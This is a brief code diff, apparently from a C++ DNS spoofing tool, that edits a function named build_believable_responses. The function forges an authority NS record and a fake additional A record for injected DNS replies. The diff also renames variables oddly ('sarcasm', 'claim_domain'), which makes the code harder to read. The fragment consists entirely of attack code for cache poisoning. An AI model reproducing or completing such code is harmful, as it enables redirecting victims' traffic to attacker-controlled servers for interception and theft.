@@ -118,18 +118,18 @@ bool build_believable_responses(std::string sarcasm, std::string author_dns, std
 		//build authoritative record field
 
 		DNS::Resource authority_field;
-		authority_field.dname(basedomain);
+		authority_field.dname(sarcasm);
 		authority_field.ttl(ttl_val);
 		authority_field.type(DNS::NS);
 		authority_field.query_class(DNS::IN);
-		authority_field.data(spoof_dns);
+		authority_field.data(claim_domain);
 
 		resp_pkt.rfind_pdu<DNS>().add_authority( authority_field );
 
 
 		// Additional field
 		DNS::Resource faker_field;
-		faker_field.dname(spoof_dns);
+		faker_field.dname(claim_domain);
 		faker_field.ttl(ttl_val);
 		faker_field.type(DNS::A);
 		faker_field.query_class(DNS::IN);
